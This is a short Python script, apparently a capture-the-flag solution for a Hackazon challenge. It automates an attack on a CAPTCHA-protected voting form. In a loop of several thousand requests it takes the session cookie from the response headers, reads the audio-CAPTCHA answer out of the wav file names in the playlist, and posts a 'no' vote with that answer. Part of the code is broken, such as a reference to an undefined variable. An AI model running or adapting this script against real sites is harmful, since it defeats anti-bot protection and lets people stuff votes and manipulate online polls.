import requests
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
from time import sleep
import threading
import urllib2
import urllib
import re
from python_anticaptcha import AnticaptchaClient, ImageToTextTask
from os.path import basename
from urlparse import urlsplit

x = 0
url = "https://1c39a840b64a939d791ee94e886f9d00.challenge.hackazon.org/"

while (x < 5288):
		

	r3 = requests.get(url)

	txt = str(r3.headers)
	sesh1 = txt.split(':')
	shesh2 = sesh1[3].split(';')
	sesh3 = shesh2[0].replace("'", "")
	sesh = sesh3.replace(" ", "")
	print(sesh)
	head1 = {'Cookie': sesh}

	imgUrls = re.findall('img .*?src="(.*?)"', r.content)
	
	fullUrl1 = "https://1c39a840b64a939d791ee94e886f9d00.challenge.hackazon.org/" + str(imgUrls[0])
	requests.get(fullUrl1, headers = head1)

	files = re.findall('href="(.*?)"', r3.content)
	url1 = files[2]
	
	fullUrl = "https://1c39a840b64a939d791ee94e886f9d00.challenge.hackazon.org" + str(url1)

	r2 = requests.get(fullUrl, headers = head1)
	wavs1 = str(r2.content).split("/")
	wavs2 = wavs1[4].split(".")
	wavs3 = wavs1[17].split(".")
	wavs4 = wavs1[30].split(".")
	wavs5 = wavs1[43].split(".")
	wavs6 = wavs1[56].split(".")
	wavs7 =  wavs1[69].split(".")

	#url = "https://httpbin.org/post"
	#r1 = 
	captcha = wavs2[0] + wavs3[0] + wavs4[0] + wavs5[0] + wavs6[0] + wavs7[0]
	param = "captcha_code=" + str(captcha) + "&vote=no"
	print(captcha)
	print(param)
	head = {'Content-Type': 'application/x-www-form-urlencoded',
	'Cookie': sesh}
	print(head)
	p = requests.post(url, headers = head, data = param)
	print(p)
	x = x + 1
	sleep(.01)

print("done")
	

